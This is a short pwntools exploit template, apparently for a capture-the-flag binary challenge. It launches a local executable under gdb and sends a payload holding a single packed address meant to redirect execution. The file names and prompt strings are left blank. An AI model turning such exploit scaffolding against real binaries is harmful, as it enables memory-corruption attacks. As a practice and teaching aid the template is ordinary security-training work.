from pwn import *

# file information here

executable = 
gdbinit = 

elf = ELF(executable)
p = process(elf.path)

gdb.attach(p, gdbscript=gdbinit)

p.recvuntil("")

payload = b''
payload += p64(0x400756)

p.send(payload)

p.interactive()

# with open('out.txt', 'wb') as out:
    # out.write(payload)
